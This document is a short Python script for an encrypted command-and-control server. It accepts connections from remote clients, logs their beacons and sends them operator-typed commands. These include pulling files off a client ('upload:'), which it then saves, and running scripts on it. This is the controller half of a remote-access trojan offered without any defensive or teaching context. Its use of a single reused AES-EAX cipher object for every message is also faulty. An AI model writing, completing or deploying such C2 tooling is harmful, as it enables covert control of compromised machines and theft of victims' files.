from Crypto.Cipher import AES
import socket
import threading
import time

# Initialize AES encryption
key = b'Sixteen byte key'
cipher = AES.new(key, AES.MODE_EAX)

# Global dictionary to keep track of connected clients
clients = {}
lock = threading.Lock()

def handle_client(client_socket, address):
    global clients
    client_id = f"{address[0]}:{address[1]}"
    with lock:
        clients[client_id] = client_socket
    while True:
        # Listen for encrypted beacon from the client
        encrypted_beacon = client_socket.recv(1024)
        beacon = cipher.decrypt(encrypted_beacon).decode()
        if beacon == 'beacon':
            print(f"Received encrypted beacon from {client_id} at {time.ctime()}")
        else:
            # Handle encrypted commands
            command_to_send = input(f"Enter the command for client {client_id}: ")
            encrypted_command = cipher.encrypt(command_to_send.encode())
            client_socket.send(encrypted_command)
            if command_to_send == 'exit':
                with lock:
                    del clients[client_id]
                client_socket.close()
                break
            elif command_to_send.startswith('upload:'):
                filename = command_to_send.split(':')[1]
                encrypted_file_content = client_socket.recv(4096)
                file_content = cipher.decrypt(encrypted_file_content)
                with open(filename, 'wb') as f:
                    f.write(file_content)
            elif command_to_send.startswith('runscript:'):
                encrypted_script_output = client_socket.recv(4096)
                script_output = cipher.decrypt(encrypted_script_output).decode()
                print(f"Encrypted Script Output: {script_output}")
            else:
                encrypted_command_output = client_socket.recv(1024)
                command_output = cipher.decrypt(encrypted_command_output).decode()
                print(f"Encrypted Command Output: {command_output}")

# Create a server socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 8080))
server.listen(5)

while True:
    client_socket, addr = server.accept()
    client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
    client_thread.start()
